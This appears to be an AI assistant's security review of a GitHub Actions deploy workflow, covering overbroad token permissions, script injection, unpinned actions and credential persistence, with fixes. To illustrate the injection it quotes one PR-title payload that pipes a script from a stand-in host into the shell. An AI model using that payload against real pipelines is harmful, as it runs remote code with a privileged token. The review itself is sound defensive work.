Yes, `permissions: write-all` at `.github/workflows/deploy.yml:7` grants far too much.

**The problem**
- `write-all` gives `GITHUB_TOKEN` write access to every scope: contents, packages, pull-requests, issues, actions, checks, deployments, security-events, id-token, and the rest.
- It sits at workflow level, so every job gets it.
- The trigger is `pull_request`, and the job only checks out code and echoes a string. It needs `contents: read` at most.
- Untrusted input reaches this job (see below), so a compromise would hold a token that could push code, alter releases, or mint OIDC tokens.

**Suggested fix**
```yaml
permissions: {}

jobs:
  deploy:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    permissions:
      contents: read
```
Deny everything at workflow level, then grant `contents: read` on the job. If the job later does a real deploy, add only the scopes that step uses. Examples are `id-token: write` for OIDC, or `pages: write` plus `id-token: write` for Pages. Put the write scopes in a separate job from any job that runs PR code.

**Other findings in the same file**
- **Script injection, line 14:** `${{ github.event.pull_request.title }}` is substituted into the shell script. A PR title like `"; curl evil.sh | sh #` runs arbitrary commands, and the token above is available to it. Pass the title through `env:` and quote it:
  ```yaml
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: printf 'Title is %s\n' "$PR_TITLE"
  ```
- **Unpinned action, line 13:** `actions/checkout@v4` is a mutable tag. Pin it to a full commit SHA with a version comment.
- **Credential persistence, line 13:** add `persist-credentials: false` to the checkout step.
- **No `timeout-minutes`:** the default is 360 minutes.

I haven't changed anything or run `actionlint` or `zizmor`. Say so if you want me to apply these fixes and run both.
